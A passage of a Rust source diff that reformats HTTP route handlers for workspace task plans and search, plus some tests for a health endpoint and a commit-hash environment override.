-                let raw_path = query.get("path").map(|s| s.as_str()).unwrap_or("");
-                let workspace_path = percent_decode_str(raw_path).decode_utf8_lossy().to_string();
-                // Optional `session` scopes the result to that session's focused
-                // plan; absent → every plan (matches the direct fn contract).
-                let session_id = query.get("session").map(|s| s.as_str());
-                let plans = crate::prd_tasks::list_workspace_task_plans(
-                    std::path::Path::new(&workspace_path),
-                    session_id,
-                );
-                let body = serde_json::to_string(&plans).unwrap_or_default();
-                let _ = request.respond(
-                    tiny_http::Response::from_string(body).with_header(json_header),
-                );
-            }
+    let raw_path = query.get("path").map(|s| s.as_str()).unwrap_or("");
+    let workspace_path = percent_decode_str(raw_path).decode_utf8_lossy().to_string();
+    // Optional `session` scopes the result to that session's focused
+    // plan; absent → every plan (matches the direct fn contract).
+    let session_id = query.get("session").map(|s| s.as_str());
+    let plans = crate::prd_tasks::list_workspace_task_plans(
+        std::path::Path::new(&workspace_path),
+        session_id,
+    );
+    let body = serde_json::to_string(&plans).unwrap_or_default();
+    let _ = request.respond(tiny_http::Response::from_string(body).with_header(json_header));
+}
 
 /// `GET /plan_forest?path=<workspace>` — the workspace's plan forest with its
 /// handoff chains joined in. Chains are filtered to the requested workspace here
@@ -1012,17 +984,15 @@ pub(crate) fn route_search(
 ) {
     let search_index = ctx.search_index;
 
-                let q = query.get("q").cloned().unwrap_or_default();
-                let limit: usize = query
-                    .get("limit")
-                    .and_then(|s| s.parse().ok())
-                    .unwrap_or(50);
-                let hits = search_index.search(&q, limit).unwrap_or_default();
-                let body = serde_json::to_string(&hits).unwrap_or_default();
-                let _ = request.respond(
-                    tiny_http::Response::from_string(body).with_header(json_header),
-                );
-            }
+    let q = query.get("q").cloned().unwrap_or_default();
+    let limit: usize = query
+        .get("limit")
+        .and_then(|s| s.parse().ok())
+        .unwrap_or(50);
+    let hits = search_index.search(&q, limit).unwrap_or_default();
+    let body = serde_json::to_string(&hits).unwrap_or_default();
+    let _ = request.respond(tiny_http::Response::from_string(body).with_header(json_header));
+}
 
 #[cfg(test)]
 mod tests {
@@ -1044,9 +1014,11 @@ mod tests {
     /// (seen 2026-09-15: `left: "1961dad", right: "0123456"`, green on a rerun).
     #[test]
     fn health_body_is_json_carrying_version_commit_and_status() {
-        let _g = ENV_LOCK.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
-        let v: serde_json::Value = serde_json::from_str(&health_body())
-            .expect("/health must answer parseable JSON");
+        let _g = ENV_LOCK
+            .lock()
+            .unwrap_or_else(std::sync::PoisonError::into_inner);
+        let v: serde_json::Value =
+            serde_json::from_str(&health_body()).expect("/health must answer parseable JSON");
         assert_eq!(v["version"], server_version());
         assert_eq!(v["status"], "ok");
         assert_eq!(v["commit"], build_commit());
@@ -1095,7 +1067,10 @@ mod tests {
     fn runtime_env_overrides_and_truncates() {
         let _g = ENV_LOCK.lock().unwrap();
         let prev = std::env::var("FLEET_GIT_COMMIT").ok();
-        std::env::set_var("FLEET_GIT_COMMIT", "0123456789abcdef0123456789abcdef01234567");
+        std::env::set_var(
+            "FLEET_GIT_COMMIT",
+            "0123456789abcdef0123456789abcdef01234567",
+        );
         assert_eq!(build_commit(), "0123456");
         // Blank is not an override — fall through to the stamp.
         std::env::set_var("FLEET_GIT_COMMIT", "   ");
